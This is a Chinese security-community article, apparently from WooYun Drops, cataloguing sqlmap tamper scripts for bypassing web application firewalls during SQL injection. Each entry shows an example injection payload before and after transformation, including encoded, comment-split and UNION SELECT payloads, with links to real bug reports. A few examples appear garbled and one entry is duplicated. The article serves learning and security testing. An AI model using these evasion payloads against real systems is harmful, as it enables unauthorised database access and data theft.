@@ -1,0 +1,110 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">使用sqlmap中tamper脚本绕过waf</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">刘海哥</a> <span class="bull">·</span> <time title="2015/02/02 11:26" ui-time="" datetime="2015/02/02 11:26" class="published ng-binding ng-isolate-scope">2015/02/02 11:26</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 背景</h1><hr><p>sqlmap中的tamper脚本来对目标进行更高效的攻击。</p><p>由于乌云知识库少了sqlmap-tamper 收集一下，方便学习。 根据sqlmap中的tamper脚本可以学习过绕过一些技巧。 我收集在找相关的案例作为可分析什么环境使用什么tamper脚本。 小学生毕业的我，着能偷偷说一下多做一些收集对吸收知识很快。</p><h1>0x01 start</h1><hr><h2>脚本名：apostrophemask.py</h2><hr><p>作用：用utf8代替引号</p><pre><code>#!sql
+Example: ("1 AND '1'='1") '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'
+</code></pre><p>Tested against: all</p><h2>脚本名：equaltolike.py</h2><hr><p>作用：like 代替等号</p><pre><code>#!sql
+Example:
+
+*   Input: SELECT * FROM users WHERE id=1
+
+*   Output: SELECT * FROM users WHERE id LIKE 1
+</code></pre><p>案例一: http://wooyun.org/bugs/wooyun-2010-087296</p><p>案例二: http://wooyun.org/bugs/wooyun-2010-074790</p><p>案例三：http://wooyun.org/bugs/wooyun-2010-072489</p><p>脚本名：space2dash.py</p><hr><p>作用：绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</p><pre><code>#!sql
+Example: ('1 AND 9227=9227') '1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'
+</code></pre><p>Tested against: * MSSQL * SQLite</p><p>案例一：http://wooyun.org/bugs/wooyun-2010-062878</p><h2>脚本名：greatest.py</h2><hr><p>作用：绕过过滤’>’ ,用GREATEST替换大于号。</p><pre><code>#!sql
+Example: ('1 AND A &gt; B') '1 AND GREATEST(A,B+1)=A' Tested against: * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 
+</code></pre><h2>脚本名：space2hash.py</h2><hr><p>作用：空格替换为#号 随机字符串 以及换行符</p><pre><code>#!sql
+Example:
+
+*   Input: 1 AND 9227=9227
+*   Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227
+</code></pre><p>Requirement:</p><ul><li><p>MySQL Tested against:</p></li><li><p>MySQL 4.0, 5.0</p></li></ul><p>参考:<a href="http://www.f4ck.org/article-2183-1.html">法克的一篇文章</a></p><h2>脚本名：apostrophenullencode.py</h2><hr><p>作用：绕过过滤双引号，替换字符和双引号。</p><pre><code>#!sql
+Example: tamper("1 AND '1'='1") '1 AND %00%271%00%27=%00%271'
+</code></pre><p>Tested against:</p><ul><li><p>MySQL 4, 5.0 and 5.5</p></li><li><p>Oracle 10g</p></li><li><p>PostgreSQL 8.3, 8.4, 9.0</p></li></ul><h2>脚本名：halfversionedmorekeywords.py</h2><hr><p>作用：当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</p><pre><code>#!sql
+Example:
+
+("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa") "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"
+</code></pre><p>Requirement:</p><ul><li>MySQL &lt; 5.1</li></ul><p>Tested against:</p><ul><li>MySQL 4.0.18, 5.0.22</li></ul><h2>脚本名：space2morehash.py</h2><hr><p>作用：空格替换为 #号 以及更多随机字符串 换行符</p><pre><code>#!sql
+Example: 
+
+* Input: 1 AND 9227=9227 
+
+* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 
+</code></pre><p>Requirement: * MySQL >= 5.1.13 Tested</p><p>against: * MySQL 5.1.41</p><p>案例一:<a href="http://www.91ri.org/5411.html">91ri一篇文章</a></p><h2>脚本名：appendnullbyte.py</h2><hr><p>作用：在有效负荷结束位置加载零字节字符编码</p><pre><code>#!sql
+Example: ('1 AND 1=1') '1 AND 1=1%00' 
+</code></pre><p>Requirement:</p><ul><li>Microsoft Access</li></ul><h2>脚本名：ifnull2ifisnull.py</h2><hr><p>作用：绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</p><pre><code>#!sql
+Example:
+
+('IFNULL(1, 2)') 'IF(ISNULL(1),2,1)' 
+</code></pre><p>Requirement:</p><ul><li><p>MySQL</p></li><li><p>SQLite (possibly)</p></li><li><p>SAP MaxDB (possibly)</p></li></ul><p>Tested against:</p><ul><li>MySQL 5.0 and 5.5</li></ul><h2>脚本名：space2mssqlblank.py(mssql)</h2><hr><p>作用：空格替换为其它空符号</p><p>Example: * Input: SELECT id FROM users * Output: SELECT%08id%02FROM%0Fusers</p><p>Requirement: * Microsoft SQL Server Tested against: * Microsoft SQL Server 2000 * Microsoft SQL Server 2005</p><h2>ASCII table:</h2><hr><p>案例一: wooyun.org/bugs/wooyun-2010-062878</p><h2>脚本名：base64encode.py</h2><hr><p>作用：用base64编码替换 Example: ("1' AND SLEEP(5)#") 'MScgQU5EIFNMRUVQKDUpIw==' Requirement: all</p><p>案例一: http://wooyun.org/bugs/wooyun-2010-060071</p><p>案例二: http://wooyun.org/bugs/wooyun-2010-021062</p><p>案例三: http://wooyun.org/bugs/wooyun-2010-043229</p><h2>脚本名：space2mssqlhash.py</h2><hr><p>作用：替换空格</p><pre><code>#!sql
+Example: ('1 AND 9227=9227') '1%23%0AAND%23%0A9227=9227' Requirement: * MSSQL * MySQL 
+</code></pre><h2>脚本名：modsecurityversioned.py</h2><hr><p>作用：过滤空格，包含完整的查询版本注释</p><pre><code>#!sql
+Example: ('1 AND 2&gt;1--') '1 /*!30874AND 2&gt;1*/--' 
+</code></pre><p>Requirement: * MySQL</p><p>Tested against:</p><ul><li>MySQL 5.0</li></ul><h2>脚本名：space2mysqlblank.py</h2><hr><p>作用：空格替换其它空白符号(mysql)</p><pre><code>#!sql
+Example: 
+
+* Input: SELECT id FROM users 
+
+* Output: SELECT%0Bid%0BFROM%A0users 
+</code></pre><p>Requirement:</p><ul><li>MySQL</li></ul><p>Tested against:</p><ul><li>MySQL 5.1</li></ul><p>案例一:wooyun.org/bugs/wooyun-2010-076735</p><h2>脚本名：between.py</h2><hr><p>作用：用between替换大于号（>）</p><pre><code>#!sql
+Example: ('1 AND A &gt; B--') '1 AND A NOT BETWEEN 0 AND B--' 
+</code></pre><p>Tested against:</p><ul><li><p>Microsoft SQL Server 2005</p></li><li><p>MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0</p></li></ul><p>案例一:wooyun.org/bugs/wooyun-2010-068815</p><h2>脚本名：space2mysqldash.py</h2><hr><p>作用：替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</p><p>注：之前有个mssql的 这个是mysql的</p><pre><code>#!sql
+Example: ('1 AND 9227=9227') '1--%0AAND--%0A9227=9227'
+</code></pre><p>Requirement:</p><ul><li><p>MySQL</p></li><li><p>MSSQL</p></li></ul><h2>脚本名：multiplespaces.py</h2><hr><p>作用：围绕SQL关键字添加多个空格</p><pre><code>#!sql
+Example: ('1 UNION SELECT foobar') '1 UNION SELECT foobar' 
+</code></pre><p>Tested against: all</p><p>案例一: wooyun.org/bugs/wooyun-2010-072489</p><h2>脚本名：space2plus.py</h2><hr><p>作用：用+替换空格</p><pre><code>#!sql
+Example: ('SELECT id FROM users') 'SELECT+id+FROM+users' Tested against: all 
+</code></pre><h2>脚本名：bluecoat.py</h2><hr><p>作用：代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</p><pre><code>#!sql
+Example: ('SELECT id FROM users where id = 1') 'SELECT%09id FROM users where id LIKE 1' 
+</code></pre><p>Tested against:</p><ul><li>MySQL 5.1, SGOS</li></ul><h2>脚本名：nonrecursivereplacement.py</h2><hr><p>双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters</p><pre><code>#!sql
+Example: ('1 UNION SELECT 2--') '1 UNIOUNIONN SELESELECTCT 2--' Tested against: all 
+</code></pre><h2>脚本名：space2randomblank.py</h2><hr><p>作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p><pre><code>#!sql
+Example: ('SELECT id FROM users') 'SELECT%0Did%0DFROM%0Ausers'
+</code></pre><p>Tested against: all</p><h2>脚本名：sp_password.py</h2><hr><p>作用：追加sp&#95;password’从DBMS日志的自动模糊处理的有效载荷的末尾</p><pre><code>#!sql
+Example: ('1 AND 9227=9227-- ') '1 AND 9227=9227-- sp\_password' Requirement: * MSSQL 
+</code></pre><h2>脚本名：chardoubleencode.py</h2><hr><p>作用: 双url编码(不处理以编码的)</p><pre><code>#!sql
+Example: 
+
+* Input: SELECT FIELD FROM%20TABLE 
+
+* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545
+</code></pre><h2>脚本名：unionalltounion.py</h2><hr><p>作用：替换UNION ALL SELECT UNION SELECT</p><p>Example: ('-1 UNION ALL SELECT') '-1 UNION SELECT'</p><p>Requirement: all</p><h2>脚本名：charencode.py</h2><hr><p>作用：url编码</p><pre><code>#!sql
+Example:
+
+*   Input: SELECT FIELD FROM%20TABLE
+
+*   Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45
+</code></pre><p>tested against:</p><ul><li><p>Microsoft SQL Server 2005</p></li><li><p>MySQL 4, 5.0 and 5.5</p></li><li><p>Oracle 10g</p></li><li><p>PostgreSQL 8.3, 8.4, 9.0</p></li></ul><h2>脚本名：randomcase.py</h2><hr><p>作用：随机大小写 Example:</p><ul><li>Input: INSERT</li><li>Output: InsERt</li></ul><p>Tested against:</p><ul><li><p>Microsoft SQL Server 2005</p></li><li><p>MySQL 4, 5.0 and 5.5</p></li><li><p>Oracle 10g</p></li><li><p>PostgreSQL 8.3, 8.4, 9.0</p></li></ul><h2>脚本名：unmagicquotes.py</h2><hr><p>作用：宽字符绕过 GPC addslashes</p><pre><code>#!sql
+Example: 
+
+* Input: 1′ AND 1=1 
+
+* Output: 1%bf%27 AND 1=1–%20
+</code></pre><h2>脚本名：randomcomments.py</h2><hr><p>作用：用/**/分割sql关键字</p><pre><code>#!sql
+Example:
+
+‘INSERT’ becomes ‘IN//S//ERT’
+</code></pre><h2>脚本名：charunicodeencode.py</h2><hr><p>作用：字符串 unicode 编码</p><pre><code>#!sql
+Example: 
+
+* Input: SELECT FIELD%20FROM TABLE 
+
+* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′
+</code></pre><p>Requirement:</p><ul><li><p>ASP</p></li><li><p>ASP.NET</p></li></ul><p>Tested against:</p><ul><li><p>Microsoft SQL Server 2000</p></li><li><p>Microsoft SQL Server 2005</p></li><li><p>MySQL 5.1.56</p></li><li><p>PostgreSQL 9.0.3</p></li></ul><p>案例一: wooyun.org/bugs/wooyun-2010-074261</p><h2>脚本名：securesphere.py</h2><hr><p>作用：追加特制的字符串</p><pre><code>#!sql
+Example: ('1 AND 1=1') "1 AND 1=1 and '0having'='0having'" 
+</code></pre><p>Tested against: all</p><h2>脚本名：versionedmorekeywords.py</h2><hr><p>作用：注释绕过</p><pre><code>#!sql
+Example: 
+
+* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 
+
+* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))# 
+</code></pre><p>Requirement:</p><ul><li>MySQL >= 5.1.13</li></ul><h2>脚本名：space2comment.py</h2><hr><p>作用：Replaces space character (‘ ‘) with comments ‘/**/’</p><pre><code>#!sql
+Example: 
+
+* Input: SELECT id FROM users 
+
+* Output: SELECT//id//FROM/**/users
+</code></pre><p>Tested against:</p><ul><li><p>Microsoft SQL Server 2005</p></li><li><p>MySQL 4, 5.0 and 5.5</p></li><li><p>Oracle 10g</p></li><li><p>PostgreSQL 8.3, 8.4, 9.0</p></li></ul><p>案例一:wooyun.org/bugs/wooyun-2010-046496</p><h2>脚本名：halfversionedmorekeywords.py</h2><hr><p>作用：关键字前加注释</p><pre><code>#!sql
+Example: 
+
+* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa 
+
+* Output: value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’='QDWa
+</code></pre><p>Requirement:</p><ul><li>MySQL &lt; 5.1</li></ul><p>Tested against:</p><ul><li>MySQL 4.0.18, 5.0.22</li></ul><p>收集于: http://www.91ri.org/7852.html http://www.91ri.org/7869.html http://www.91ri.org/7860.html</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/132" rel="bookmark" id="re1">waf 绕过的技巧</a></li><li><a href="http://drops.wooyun.org/papers/346" rel="bookmark" id="re2">终端机的安全性</a></li><li><a href="http://drops.wooyun.org/papers/345" rel="bookmark" id="re3">在线支付逻辑漏洞总结</a></li><li><a href="http://drops.wooyun.org/tips/7299" rel="bookmark" id="re4">MySQL注入技巧</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">NeverEnd</span> <span class="reply-time">2016-03-27 18:19:48</span></div><p></p><p>多谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">codefamily</span> <span class="reply-time">2015-02-26 09:48:23</span></div><p></p><p>我这网站有群的么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">隐形人真忙</span> <span class="reply-time">2015-02-06 18:58:11</span></div><p></p><p>这样归纳整理很好啊，在前人的基础上面整理整理，由量变到质变，发现新的技术。谢谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">黑吃黑</span> <span class="reply-time">2015-02-04 09:19:09</span></div><p></p><p>多谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Vig0r</span> <span class="reply-time">2015-02-03 14:22:30</span></div><p></p><p>Sqlmap Tamper大全+乌云综合</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-02-03 13:42:21</span></div><p></p><p>这样归纳整理很好啊，在前人的基础上面整理整理，由量变到质变，发现新的技术。谢谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Spy4man</span> <span class="reply-time">2015-02-03 12:03:34</span></div><p></p><p>这样归纳整理很好啊，在前人的基础上面整理整理，由量变到质变，发现新的技术。谢谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">菜鸟</span> <span class="reply-time">2015-02-03 11:12:30</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">LongY</span> <span class="reply-time">2015-02-03 11:03:37</span></div><p></p><p>求大牛指点一二</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tenzy</span> <span class="reply-time">2015-02-03 10:38:42</span></div><p></p><p>翻译了下sqlmap的tamper<br>几篇91ri的tamper脚本绕过结合一下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xc0d3r</span> <span class="reply-time">2015-02-02 16:50:06</span></div><p></p><p>貌似就是翻译了下tamper的注释。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dbapp</span> <span class="reply-time">2015-02-02 12:17:39</span></div><p></p><p>这种常见的 sqlmap 的 绕waf 的脚本，基本已经无法绕过了。。很早就尝试过了， 有进一步的绕waf 交流不？</p><p></p></div></div></div></div></div></main>
